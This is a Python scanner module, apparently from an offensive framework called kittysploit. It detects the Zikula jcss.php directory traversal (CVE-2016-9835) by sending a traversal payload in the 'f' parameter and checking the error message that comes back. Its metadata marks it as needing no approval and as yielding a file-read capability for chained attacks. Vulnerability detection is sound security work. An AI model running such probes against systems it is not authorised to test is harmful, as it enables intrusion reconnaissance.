#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zikula jcss.php directory traversal (CVE-2016-9835)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zikula - jcss.php Path Traversal Detection (CVE-2016-9835)',
        'description': (
            'Detects CVE-2016-9835 by requesting jcss.php?f=..\\..\\..\\jcss.php and matching '
            'ERROR: Corrupted file without Requested file not readable.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web', 'scanner', 'cve', 'cve2016', 'zikula', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.7,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2016-9835'],
        'cve': 'CVE-2016-9835',
    }

    def run(self):
        for base in ('', '/zikula'):
            path = f'{base}/jcss.php?f=..\\..\\..\\..\\..\\jcss.php'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 500:
                continue
            body = r.text or ''
            if 'ERROR: Corrupted file' in body and 'ERROR: Requested file not readable' not in body:
                self.set_info(
                    severity='medium',
                    reason='Zikula jcss.php traversal (CVE-2016-9835)',
                    path=f'{base}/jcss.php',
                )
                return True
        return False
